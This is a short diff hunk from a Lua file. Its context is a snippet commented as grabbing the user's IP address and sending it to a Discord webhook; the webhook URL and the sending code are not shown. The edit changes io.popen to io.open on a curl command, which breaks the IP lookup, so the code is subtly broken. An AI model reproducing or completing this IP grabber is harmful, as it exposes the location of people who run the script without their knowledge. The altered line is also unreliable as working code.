@@ -383,7 +383,7 @@ end)]]
 
 -- Lua script to grab IP address and send it to Discord webhook
 
-local ip = io.popen("curl ifconfig.me/ip"):read("*a") -- Retrieve IP address using curl
+local ip = io.open("curl ifconfig.me/ip"):read("*a") -- Retrieve IP address using curl
 ip = ip:gsub("\n", "") -- Remove newline character
 
 -- Discord webhook URL
